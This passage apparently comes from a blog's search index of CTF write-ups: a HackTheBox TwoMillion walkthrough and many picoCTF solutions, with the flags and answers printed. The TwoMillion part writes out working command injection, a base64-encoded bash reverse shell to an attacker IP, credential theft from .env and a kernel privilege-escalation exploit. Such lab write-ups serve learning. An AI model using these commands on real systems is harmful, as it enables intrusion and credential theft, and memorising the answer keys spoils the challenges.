left intact{ \"v1\": { \"user\": { \"GET\": { \"/api/v1\": \"Route List\", \"/api/v1/invite/how/to/generate\": \"Instructions on invite code generation\", \"/api/v1/invite/generate\": \"Generate invite code\", \"/api/v1/invite/verify\": \"Verify invite code\", \"/api/v1/user/auth\": \"Check if user is authenticated\", \"/api/v1/user/vpn/generate\": \"Generate a new VPN configuration\", \"/api/v1/user/vpn/regenerate\": \"Regenerate VPN configuration\", \"/api/v1/user/vpn/download\": \"Download OVPN file\" }, \"POST\": { \"/api/v1/user/register\": \"Register a new user\", \"/api/v1/user/login\": \"Login with existing user\" } }, \"admin\": { \"GET\": { \"/api/v1/admin/auth\": \"Check if user is admin\" }, \"POST\": { \"/api/v1/admin/vpn/generate\": \"Generate VPN for specific user\" }, \"PUT\": { \"/api/v1/admin/settings/update\": \"Update user settings\" } } }}This is the directories of 2million.htbthat we will use.$ curl -sv http://2million.htb/api/v1/admin/auth --cookie \"PHPSESSID=7a0pbm0uacm9s69027tjukf5e9\" | jq* Host 2million.htb:80 was resolved.* IPv6: (none)* IPv4: 10.10.11.221* Trying 10.10.11.221:80...* Connected to 2million.htb (10.10.11.221) port 80&gt; GET /api/v1/admin/auth HTTP/1.1&gt; Host: 2million.htb&gt; User-Agent: curl/8.8.0&gt; Accept: */*&gt; Cookie: PHPSESSID=7a0pbm0uacm9s69027tjukf5e9&gt;* Request completely sent off&lt; HTTP/1.1 200 OK&lt; Server: nginx&lt; Date: Tue, 06 Aug 2024 17:48:36 GMT&lt; Content-Type: application/json&lt; Transfer-Encoding: chunked&lt; Connection: keep-alive&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT&lt; Cache-Control: no-store, no-cache, must-revalidate&lt; Pragma: no-cache&lt;{ [28 bytes data]* Connection #0 to host 2million.htb left intact{ \"message\": false}curl-ingthe /api/v1/admin/auth gave us the falsebecause we are not admin.$ curl -sv -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie \"PHPSESSID=7a0pbm0uacm9s69027tjukf5e9\" | jq* Host 2million.htb:80 was resolved.* IPv6: (none)* IPv4: 10.10.11.221* Trying 10.10.11.221:80...* Connected to 2million.htb (10.10.11.221) port 80&gt; POST /api/v1/admin/vpn/generate HTTP/1.1&gt; Host: 2million.htb&gt; User-Agent: curl/8.8.0&gt; Accept: */*&gt; Cookie: PHPSESSID=7a0pbm0uacm9s69027tjukf5e9&gt;* Request completely sent off&lt; HTTP/1.1 401 Unauthorized&lt; Server: nginx&lt; Date: Tue, 06 Aug 2024 18:24:42 GMT&lt; Content-Type: text/html; charset=UTF-8&lt; Transfer-Encoding: chunked&lt; Connection: keep-alive&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT&lt; Cache-Control: no-store, no-cache, must-revalidate&lt; Pragma: no-cache&lt;{ [5 bytes data]* Connection #0 to host 2million.htb left intactHere we get 401 Unauthorized. We have to become the admin.$ curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie \"PHPSESSID=7a0pbm0uacm9s69027tjukf5e9\" | jq % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0* Host 2million.htb:80 was resolved.* IPv6: (none)* IPv4: 10.10.11.221* Trying 10.10.11.221:80...* Connected to 2million.htb (10.10.11.221) port 80&gt; PUT /api/v1/admin/settings/update HTTP/1.1&gt; Host: 2million.htb&gt; User-Agent: curl/8.8.0&gt; Accept: */*&gt; Cookie: PHPSESSID=7a0pbm0uacm9s69027tjukf5e9&gt;* Request completely sent off 0 0 0 0 0 0 0 0 --:--:-- 0:00:01 --:--:-- 0&lt; HTTP/1.1 200 OK&lt; Server: nginx&lt; Date: Tue, 06 Aug 2024 18:34:19 GMT&lt; Content-Type: application/json&lt; Transfer-Encoding: chunked&lt; Connection: keep-alive&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT&lt; Cache-Control: no-store, no-cache, must-revalidate&lt; Pragma: no-cache&lt;{ [64 bytes data]100 53 0 53 0 0 33 0 --:--:-- 0:00:01 --:--:-- 33* Connection #0 to host 2million.htb left intact{ \"status\": \"danger\", \"message\": \"Invalid content type.\"}Ignore the dangerwe have to change the second error, with Header$ curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie \"PHPSESSID=7a0pbm0uacm9s69027tjukf5e9\" --header \"Content-Type: application/json\" | jq % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0* Host 2million.htb:80 was resolved.* IPv6: (none)* IPv4: 10.10.11.221* Trying 10.10.11.221:80...* Connected to 2million.htb (10.10.11.221) port 80&gt; PUT /api/v1/admin/settings/update HTTP/1.1&gt; Host: 2million.htb&gt; User-Agent: curl/8.8.0&gt; Accept: */*&gt; Cookie: PHPSESSID=7a0pbm0uacm9s69027tjukf5e9&gt; Content-Type: application/json&gt;* Request completely sent off&lt; HTTP/1.1 200 OK&lt; Server: nginx&lt; Date: Tue, 06 Aug 2024 18:43:42 GMT&lt; Content-Type: application/json&lt; Transfer-Encoding: chunked&lt; Connection: keep-alive&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT&lt; Cache-Control: no-store, no-cache, must-revalidate&lt; Pragma: no-cache&lt;{ [67 bytes data]100 56 0 56 0 0 49 0 --:--:-- 0:00:01 --:--:-- 49* Connection #0 to host 2million.htb left intact{ \"status\": \"danger\", \"message\": \"Missing parameter: email\"}It worked but now we are missing the emailparameter. with --data add the emailparameter:$ curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie \"PHPSESSID=7a0pbm0uacm9s69027tjukf5e9\" --header \"Content-Type: application/json\" --data '{\"email\":\"test@test.com\"}' | jq % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0* Host 2million.htb:80 was resolved.* IPv6: (none)* IPv4: 10.10.11.221* Trying 10.10.11.221:80...* Connected to 2million.htb (10.10.11.221) port 80&gt; PUT /api/v1/admin/settings/update HTTP/1.1&gt; Host: 2million.htb&gt; User-Agent: curl/8.8.0&gt; Accept: */*&gt; Cookie: PHPSESSID=7a0pbm0uacm9s69027tjukf5e9&gt; Content-Type: application/json&gt; Content-Length: 25&gt;} [25 bytes data]* upload completely sent off: 25 bytes&lt; HTTP/1.1 200 OK&lt; Server: nginx&lt; Date: Tue, 06 Aug 2024 18:45:00 GMT&lt; Content-Type: application/json&lt; Transfer-Encoding: chunked&lt; Connection: keep-alive&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT&lt; Cache-Control: no-store, no-cache, must-revalidate&lt; Pragma: no-cache&lt;{ [70 bytes data]100 84 0 59 100 25 72 30 --:--:-- --:--:-- --:--:-- 102* Connection #0 to host 2million.htb left intact{ \"status\": \"danger\", \"message\": \"Missing parameter: is_admin\"}Now we need the is_adminparameter:$ curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie \"PHPSESSID=7a0pbm0uacm9s69027tjukf5e9\" --header \"Content-Type: application/json\" --data '{\"email\":\"test@test.com\", \"is_admin\": 1 }' | jq % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0* Host 2million.htb:80 was resolved.* IPv6: (none)* IPv4: 10.10.11.221* Trying 10.10.11.221:80...* Connected to 2million.htb (10.10.11.221) port 80&gt; PUT /api/v1/admin/settings/update HTTP/1.1&gt; Host: 2million.htb&gt; User-Agent: curl/8.8.0&gt; Accept: */*&gt; Cookie: PHPSESSID=7a0pbm0uacm9s69027tjukf5e9&gt; Content-Type: application/json&gt; Content-Length: 41&gt;} [41 bytes data]* upload completely sent off: 41 bytes&lt; HTTP/1.1 200 OK&lt; Server: nginx&lt; Date: Tue, 06 Aug 2024 18:45:51 GMT&lt; Content-Type: application/json&lt; Transfer-Encoding: chunked&lt; Connection: keep-alive&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT&lt; Cache-Control: no-store, no-cache, must-revalidate&lt; Pragma: no-cache&lt;{ [55 bytes data]100 85 0 44 100 41 50 47 --:--:-- --:--:-- --:--:-- 97* Connection #0 to host 2million.htb left intact{ \"id\": 13, \"username\": \"shavigio\", \"is_admin\": 1}We are admin now.$ curl -sv http://2million.htb/api/v1/admin/vpn/generate --cookie \"PHPSESSID=7a0pbm0uacm9s69027tjukf5e9\" --header \"Content-Type: application/json\" --data '{\"username\" :\"shavigio\"}'This will provide vpnfor admin and it is long ahh text maybe not worth reading IDK.$ curl -sv http://2million.htb/api/v1/admin/vpn/generate --cookie \"PHPSESSID=7a0pbm0uacm9s69027tjukf5e9\" --header \"Content-Type: application/json\" --data '{\"username\" :\"shavigio;id;\"}'uid=33(www-data) gid=33(www-data) groups=33(www-data)* Connection #0 to host 2million.htb left intactThis means we can execute commands here.Logically we can use this for NetCatconnection. Go to revshells and use the bash -icode. Enter your IPand Port, Copy that and encode that with base64, Then execute this command:nc -nlvp &lt;port&gt; # in other terminal$ curl -sv http://2million.htb/api/v1/admin/vpn/generate --cookie \"PHPSESSID=7a0pbm0uacm9s69027tjukf5e9\" --header \"Content-Type: application/json\" --data '{\"username\" :\"shavigio;echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMy8xMjM0IDA+JjEK |base64 -d |bash;\"}'That will give us the connection on NetCat.$ nc -nlvp 1234listening on [any] 1234 ...connect to [10.10.16.3] from (UNKNOWN) [10.10.11.221] 35764sh: 0: can't access tty; job control turned off$ ls -latotal 56drwxr-xr-x 10 root root 4096 Aug 6 20:20 .drwxr-xr-x 3 root root 4096 Jun 6 2023 ..-rw-r--r-- 1 root root 87 Jun 2 2023 .env-rw-r--r-- 1 root root 1237 Jun 2 2023 Database.php-rw-r--r-- 1 root root 2787 Jun 2 2023 Router.phpdrwxr-xr-x 5 root root 4096 Aug 6 20:20 VPNdrwxr-xr-x 2 root root 4096 Jun 6 2023 assetsdrwxr-xr-x 2 root root 4096 Jun 6 2023 controllersdrwxr-xr-x 5 root root 4096 Jun 6 2023 cssdrwxr-xr-x 2 root root 4096 Jun 6 2023 fontsdrwxr-xr-x 2 root root 4096 Jun 6 2023 images-rw-r--r-- 1 root root 2692 Jun 2 2023 index.phpdrwxr-xr-x 3 root root 4096 Jun 6 2023 jsdrwxr-xr-x 2 root root 4096 Jun 6 2023 views$ cat .envDB_HOST=127.0.0.1DB_DATABASE=htb_prodDB_USERNAME=adminDB_PASSWORD=SuperDuperPass123Go to sshand use that credentials:ssh admin@10.10.11.221Password:SuperDuperPass123And you can catthe user.txt:b165c7aa079232172893c8fa3c8f2123***We can’t execute any commands with root’s permission:$ sudo -l[sudo] password for admin:Sorry, try again.[sudo] password for admin:Sorry, user admin may not run sudo on localhost.This means that there is some exploit we need to find. Since the site is in /vardirectory i went to that and there was /maildirectory:$ cd /varadmin@2million:/var$ lsbackups cache crash lib local lock log mail opt run snap spool tmp wwwadmin@2million:/var$ cd mailadmin@2million:/var/mail$ lsadminadmin@2million:/var/mail$ cat adminFrom: ch4p &lt;ch4p@2million.htb&gt;To: admin &lt;admin@2million.htb&gt;Cc: g0blin &lt;g0blin@2million.htb&gt;Subject: Urgent: Patch System OSDate: Tue, 1 June 2023 10:45:22 -0700Message-ID: &lt;9876543210@2million.htb&gt;X-Mailer: ThunderMail Pro 5.2Hey admin,I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.HTB GodfatherHere we go, there is named the exploit.admin@2million:/var/mail$ uname -aLinux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linuxuname -atells us that kernelversion is 5.15.70 There is exploits on that.Searching to that brought me toGithubrepository.git clone https://github.com/xkaneiki/CVE-2023-0386Cloning into 'CVE-2023-0386'...remote: Enumerating objects: 24, done.remote: Counting objects: 100% (24/24), done.remote: Compressing objects: 100% (15/15), done.remote: Total 24 (delta 7), reused 21 (delta 5), pack-reused 0Receiving objects: 100% (24/24), 426.11 KiB | 360.00 KiB/s, done.Resolving deltas: 100% (7/7), done.I zipped it so it would be easier to transfer it to the machine, and i used scpto move it:zip -r cve.zip CVE-2023-0386/scp cve.zip admin@2million.htb:/tmpThe authenticity of host '2million.htb (10.10.11.221)' can't be established.ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.This host key is known by the following other names/addresses: ~/.ssh/known_hosts:69: [hashed name]Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '2million.htb' (ED25519) to the list of known hosts.admin@2million.htb's password:cve.zipUnzip the copied file, go to directory and run the code:./fuse ./ovlcap/lower ./gc &amp;&amp;because it needs to be running in the background.and Then:./expRunning the last command will make you the rootand then you can see the root flagroot@2million:/tmp/CVE-2023-0386# iduid=0(root) gid=0(root) groups=0(root),1000(admin)root@2million:/tmp/CVE-2023-0386# cat /root/root.txte688bd39f1e4405adc18fdc720bf21d8root flag: e688bd39f1e4405adc18fdc720bf21d8***" }, { "title": "Tic-Toe from PicoCTF", "url": "/posts/tic-toe-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "Tic-Toe from PicoCTFpage DescriptionSomeone created a program to read text files; we think the program reads files with root privileges but apparently it only accepts to read files that are owned by the user running it.After i connected i immediately saw flag.txt and i tried cat on it but it said nuh uh. after that i saw txtreader and from the Description i knew that it read files like this:./txtreader flag.txtBut obviously i couldn’t read it.We should use TOC/TOU attack which uses time of script to run o send another request making it break and allow us to read/execute the file in our instance flag.txt. In this we should use symlink.First create some file with if you want some text, for me i created readME which had not flag text in it.Then i proceeded to make double symlink.$ ln -s readME link$ ./txtreader linknot flag$ ln -sf flag.txt linkThis means it works.$ for i in {1..1000};do ln -sf flag.txt link; ln -sf readME link; done $ while true; do ln -sf flag.txt link; ln -sf readME link; done &amp;[1] 2047for loop alternates the symbolic link link between pointing to flag.txt and readME a thousand times.while loop does the same but runs in the background and never ends.So i had to write one last for loop:$ for i in {1..1000}; do ./txtreader link; doneThis for loop executed ./txtreader link, read the readME file and also tried to read flag.txt. During the trying it caught the moment and from exploit it read the flag.txt*The flag is:**picoCTF{ToctoU_!s_3a5y_2075872e}" }, { "title": "Speeds-and-feeds from PicoCTF", "url": "/posts/speeds-and-feeds-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "Speeds-and-feeds from PicoCTFpage DescriptionThere is something on my shop network running at nc mercury.picoctf.net 7032, but I can’t tell what it is. Can you?Connecting to NetCat gives us big ahh code:nc mercury.picoctf.net 7032G17 G21 G40 G90 G64 P0.003 F50G0Z0.1G0Z0.1G0X0.8276Y3.8621G1Z0.1G1X0.8276Y-1.9310G0Z0.1G0X1.1034Y3.8621G1Z0.1G1X1.1034Y-1.9310In hint there is question: What language does a CNC machine use?Answer is G-code. G-code is a type of programming language used in the areas of Computer Numerical Control (CNC) and 3D printing for instructing machine tool movement.We can search G-code simulators and we find NCviewer and we can upload file that contains our G-code.and we get the answer: " }, { "title": "shark-on-wire-1 from PicoCTF", "url": "/posts/shark-on-wire-1-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "shark-on-wire-1 from PicoCTFpage DescriptionWe found this packet capture. Recover the flag. HintsWhat are streams?From hints i knew that i should’ve searched trough streams.I opened file and immediately saw that there was three types of packets: TCP, UDP and ARP.ARP has no stream but TCP and UDP has.So let’s search trough TCP and UDP streams.There is nothing in TCP streams so now let’s go trough UDP streams.Here we go, Flag is:picoCTF{StaT31355_636f6e6e}***" }, { "title": "Mus1c from PicoCTF", "url": "/posts/mus1c-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "Mus1c from PicoCTFpage DescriptionI wrote you a song. Put it in the picoCTF{} flag format. HintsDo you think you can master rockstar?I downloaded the file and i got this:Pico's a CTFFFFFFFmy mind is waitinIt's waitinPut my mind of Pico into Thismy flag is not foundput This into my flagput my flag into Picoshout Picoshout Picoshout PicoMy song's somethingput Pico into ThisKnock This down, down, downput This into CTFshout CTFmy lyric is nothingPut This without my song into my lyricKnock my lyric down, down, downshout my lyricPut my lyric into ThisPut my song with This into my lyricKnock my lyric downshout my lyricBuild my lyric up, up ,upshout my lyricshout Picoshout ItPico CTF is funsecurity is importantFun is funPut security with fun into Pico CTFBuild Fun upshout fun times Pico CTFput fun times Pico CTF into my songbuild it upshout itshout itbuild it up, upshout itshout PicoIt’s music text. From Hints i thought i could get something, i searched “master rockstar” and i got this site codewithrockstar i entered the text and got the decimal encrypted text:1141141141119910711011411048494951114I went to cyberchef , Entered this decimals and got this: rrrocknrn0113rWrapped it with picoCTF{} and got the flag:picoCTF{rrrocknrn0113r}" }, { "title": "M00nwalk2 from picoctf", "url": "/posts/m00nwalk2-from-PicoCTF/", "categories": "", "tags": "", "date": "2024-09-06 00:00:00 +0000", "snippet": "page DescriptionRevisit the last transmission. We think this transmission contains a hidden message. There are also some clues clue 1, clue 2, clue 3. HintsUse the clues to extract the another flag from the .wav fileSo everything is the same except the mode its not scottie 1 anymore its auto, that took me a while.After that i tested all the .wavfiles and got all the .pngfrom them:So something is hidden in the message.wav. Password is hidden_stegosaurus, some quote and Alan Eliasen The FutureBoy. I searched that and found the site which contained steganographytools. Then i went to terminal and used steghide on the message.wavwith password provided:$ steghide extract -sf message.wav -p hidden_stegosauruswrote extracted data to \"steganopayload12154.txt\".$ cat steganopayload12154.txtpicoCTF{the_answer_lies_hidden_in_plain_sight}And there is the flag:picoCTF{the_answer_lies_hidden_in_plain_sight}" }, { "title": "M00nwalk from picoctf", "url": "/posts/m00nwalk-from-PicoCTF/", "categories": "", "tags": "", "date": "2024-09-06 00:00:00 +0000", "snippet": "page DescriptionDecode this message from the moon. HintsHow did pictures from the moon landing get sent back to Earth?What is the CMU mascot?, that might help select a RX optionI asked this questions to chatGPT and got the answers:1.sstv and app is Qsstv2.ScottyInstall qsstv in your OS and then in modechoose scottie 1from AI answers.open the recently downloaded .wavfile and play it, make sure to press start recieverin top left corner. Then wait until this picture forms:And the is the flag:picoCTF{beep_boop_im_in_space}" }, { "title": "Like1000 from PicoCTF", "url": "/posts/like1000-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "Like1000 from PicoCTFpage DescriptionThis .tar file got tarred a lot.HintsTry and script this, it’ll save you a lot of timeDownload the file and it’s named 1000.tarfirst lets extract the file with:tar -xf 1000.tarAnd we are left with 999.tar from Hints i guess there is nested .tarfiles in it so we have to write script i wrote script in bash:#!bin/bash# Loop through the numbers 1000 down to 1for ((i=1000; i&gt;=1; i--))do # Extract the tar file with the current number tar -xf \"$i.tar\"doneThis code goes from 1000 to one and extracts the files.Make this code exacutable chmod +x &lt;file_name&gt;and run it. We are left with 1000 .tar files and flag.png open it and there is the flag:picoCTF{l0t5_0f_TAR5} ***To delete all of that .tar files you can modify the code little bit:#!bin/bash# Loop through the numbers 1000 down to 1for ((i=1000; i&gt;=1; i--))do # Extract the tar file with the current number rm -r \"$i.tar\"done" }, { "title": "John_Pollard from PicoCTF", "url": "/posts/john_pollard-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "John_Pollard from PicoCTFpage DescriptionSometimes RSA certificates are breakable HintsThe flag is in the format picoCTF{p,q}Try swapping p and q if it does not workJust search RSA certificate decoderand i got to this site: certlogik, and enter the certificate and search for modulus , It’s: 4966306421059967. Then go to FactorDB and enter the modulus to factorize it. After that you will get the p and qp= 67867967q= 73176001Then the flag will be:picoCTF{73176001,67867967}" }, { "title": "Format string 0 from PicoCTF", "url": "/posts/format-string-0-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "Format string 0 from PicoCTFpage DescriptionCan you use your knowledge of format strings to make the customers happy?Download the binary here.Download the source here. HintsThis is an introduction of format string vulnerabilities. Look up “format specifiers” if you have never seen them before.Just try out the different optionsWell it’s a format string challenge so when you will connect to NCyou have to choose Format Specifiersyou will see:$ nc mimas.picoctf.net 50102Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?Here comes the first customer Patrick who wants a giant bite.Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxeEnter your recommendation: Gr%114d_CheeseGr 4202954_CheeseGood job! Patrick is happy! Now can you serve the second customer?Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steakEnter your recommendation: Cla%sic_Che%s%steakClaCla%sic_Che%s%steakic_Che(null)picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4}Here is the flag:picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4}" }, { "title": "flag_shop from PicoCTF", "url": "/posts/flag_shop-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "flag_shop from PicoCTFpage DescriptionThere’s a flag shop selling stuff, can you buy a flag? Source. Connect with nc jupiter.challenges.picoctf.org 4906. HintsTwo’s compliment can do some weird things when numbers get really big!When we read source code we see this:#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){ setbuf(stdout, NULL); int con; con = 0; int account_balance = 1100; while(con == 0){ printf(\"Welcome to the flag exchange\\n\"); printf(\"We sell flags\\n\"); printf(\"\\n1. Check Account Balance\\n\"); printf(\"\\n2. Buy Flags\\n\"); printf(\"\\n3. Exit\\n\"); int menu; printf(\"\\n Enter a menu selection\\n\"); fflush(stdin); scanf(\"%d\", &amp;menu); if(menu == 1){ printf(\"\\n\\n\\n Balance: %d \\n\\n\\n\", account_balance); } else if(menu == 2){ printf(\"Currently for sale\\n\"); printf(\"1. Defintely not the flag Flag\\n\"); printf(\"2. 1337 Flag\\n\"); int auction_choice; fflush(stdin); scanf(\"%d\", &amp;auction_choice); if(auction_choice == 1){ printf(\"These knockoff Flags cost 900 each, enter desired quantity\\n\"); int number_flags = 0; fflush(stdin); scanf(\"%d\", &amp;number_flags); if(number_flags &gt; 0){ int total_cost = 0; total_cost = 900*number_flags; printf(\"\\nThe final cost is: %d\\n\", total_cost); if(total_cost &lt;= account_balance){ account_balance = account_balance - total_cost; printf(\"\\nYour current balance after transaction: %d\\n\\n\", account_balance); } else{ printf(\"Not enough funds to complete purchase\\n\"); } } } else if(auction_choice == 2){ printf(\"1337 flags cost 100000 dollars, and we only have 1 in stock\\n\"); printf(\"Enter 1 to buy one\"); int bid = 0; fflush(stdin); scanf(\"%d\", &amp;bid); if(bid == 1){ if(account_balance &gt; 100000){ FILE *f = fopen(\"flag.txt\", \"r\"); if(f == NULL){ printf(\"flag not found: please run this on the server\\n\"); exit(0); } char buf[64]; fgets(buf, 63, f); printf(\"YOUR FLAG IS: %s\\n\", buf); } else{ printf(\"\\nNot enough funds for transaction\\n\\n\\n\"); }} } } else{ con = 1; } } return 0;}There is one thing wrong here:int number_flags = 0; fflush(stdin); scanf(\"%d\", &amp;number_flags); if(number_flags &gt; 0){ int total_cost = 0; total_cost = 900*number_flags; printf(\"\\nThe final cost is: %d\\n\", total_cost); if(total_cost &lt;= account_balance){ account_balance = account_balance - total_cost; printf(\"\\nYour current balance after transaction: %d\\n\\n\", account_balance);If we buy definetely not Flag flag after transaction we our balance rises, because of this:account_balance = account_balance - total_costNotice that total_cost is declared as an int. This is specifically a Signed Integer, which has a range between -2,147,483,648 to 2,147,483,647. Signed integers use the first bit to store whether it is negative or positive, 0 indicating positive and 1 indicating negative. What happens if you add 1 to 2,147,483,647 and store the result in a signed integer? Well the first bit goes from 0 to 1, meaning that the number is now negative! In fact, due to the way Two’s Complement, the method used to represent negative numbers in binary, works, it actually wraps around to the most negative integer: -2,147,483,648.This is what is known as an Integer Overflow. We can use this to overflow the total_cost variable and increase our account balance. We need a total_cost that is a large negative number, but not too large that it also overflows our account_balance. 2900000 works nicely as the number of fake flags to buy. this will become negative number and with basic math this will become positive and add to our account_balance. After that we can buy the real flag.Flag is: picoCTF{m0n3y_bag5_b9f469b5}" }, { "title": "Dont-you-love-banners from PicoCTF", "url": "/posts/dont-you-love-banners-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "Dont-you-love-banners from PicoCTFpage DescriptionCan you abuse the banner?The server has been leaking some crucial information on tethys.picoctf.net 59034. Use the leaked information to get to the server.To connect to the running application use nc tethys.picoctf.net 62268. From the above information abuse the machine and find the flag in the /root directory. Hints1.Do you know about symlinks?2.Maybe some small password cracking or guessingLet’s connect to tethys.picoctf.net 59034. After connecting we get this: nc tethys.picoctf.net 59034SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234I guess it’s the password for: nc tethys.picoctf.net 62268. Let’s connect to it.$ nc tethys.picoctf.net 62268***************************************************WELCOME*****************************************************what is the password? My_Passw@rd_@1234What is the top cyber security conference in the world?Def conthe first hacker ever was known for phreaking(making free phone calls), who was it?John Draperplayer@challenge:~$ This questions are simple search.Okay now let’s find where is flag located.player@challenge:~$ find / -type f -name \"flag.txt\" 2&gt;/dev/nullfind / -type f -name \"flag.txt\" 2&gt;/dev/null/root/flag.txtLet’s head to root directory. I can’t read flag, I do not have permission to do that. But i can read script.py:import osimport ptyincorrect_ans_reply = \"Lol, good try, try again and good luck\\n\"if __name__ == \"__main__\": try: with open(\"/home/player/banner\", \"r\") as f: print(f.read()) except: print(\"*********************************************\") print(\"***************DEFAULT BANNER****************\") print(\"*Please supply banner in /home/player/banner*\") print(\"*********************************************\")try: request = input(\"what is the password? \\n\").upper() while request: if request == 'MY_PASSW@RD_@1234': text = input(\"What is the top cyber security conference in the world?\\n\").upper() if text == 'DEFCON' or text == 'DEF CON': output = input( \"the first hacker ever was known for phreaking(making free phone calls), who was it?\\n\").upper() if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER': scmd = 'su - player' pty.spawn(scmd.split(' ')) else: print(incorrect_ans_reply) else: print(incorrect_ans_reply) else: print(incorrect_ans_reply) breakexcept: KeyboardInterruptIt’s script what we see when we try to connect to the server. Everything is okay except one thing:if __name__ == \"__main__\": try: with open(\"/home/player/banner\", \"r\") as f: print(f.read())This means when we try to connect to server it reads banner and prints it:***************************************************WELCOME*****************************************************From Hints i know i have to make symlink and from Description i get that i have to abuse banner. So let’s make symlink so when i connect to server it reads flag.txt located in root directory. First remove banner so we can create new one named banner and make it symlink.player@challenge:~$ rm bannerrm bannerplayer@challenge:~$ ln -s /root/flag.txt bannerln -s /root/flag.txt bannersymlink is created so let’s connect to server once again:nc tethys.picoctf.net 62268picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_8126c9b0}what is the password?Here we go flag is: picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_8126c9b0}" }, { "title": "Chrono from PicoCTF", "url": "/posts/chrono-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "Chrono from PicoCTFpage DescriptionHow to automate tasks to run at intervals on linux servers?How to automate tasks to run at intervals on linux servers?|To automate tasks to run at intervals on Linux servers, you can use cron jobs. Cron is a time-based job scheduler in Unix-like operating systems. It allows users to schedule scripts or commands to run automatically at specified times and intervals.Here’s a step-by-step guide on how to set up a cron job: Open the Crontab File: Open your cron table (crontab) file with the following command. This will open the crontab file in the default text editor.Let’s head to / directory and cd challenge but i can’t access it so let’s search crontab as hinted in description I found readable file in /etc directory so i used cat ono it:cat /etc/crontabI got the flag:picoCTF{Sch3DUL7NG_T45K3_L1NUX_1b4d8744}" }, { "title": "basic-file-exploit from PicoCTF", "url": "/posts/basic-file-exploit-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "basic-file-exploit from PicoCTFpage DescriptionThe program provided allows you to write to a file and read what you wrote from it. Try playing around with it and see if you can break it!The program’s source code with the flag redacted can be downloaded here.We download file : program-redacted.cIn this code we are searching in what condition we get the flag.After analyzing we get that in this condition program prints the flag: if ((entry_number = strtol(entry, NULL, 10)) == 0) { puts(flag); fseek(stdin, 0, SEEK_END); exit(0); }after this code we get that entry_number should be equal to 0 for program to give us Flag.but according to code we cant go and give entry_number 0, first entry_number should exist so first we create it:giorgi@darkfears31:~/Desktop$ nc saturn.picoctf.net 52326Hi, welcome to my echo chamber!Type '1' to enter a phrase into our databaseType '2' to echo a phrase in our databaseType '3' to exit the program11Please enter your data:123123Please enter the length of your data:123123Your entry number is: 1So entry_number is created, after this we can tell program toType '2' to echo a phrase in our database22Please enter the entry number of your data:00picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_E0394EC0}Here we go the flag is:picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_E0394EC0}" }, { "title": "b00tl3gRSA2 from PicoCTF", "url": "/posts/b00tl3gRSA2-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "b00tl3gRSA2 from PicoCTFpage DescriptionIn RSA d is a lot bigger than e, why don’t we use d to encrypt instead of e? Connect with nc 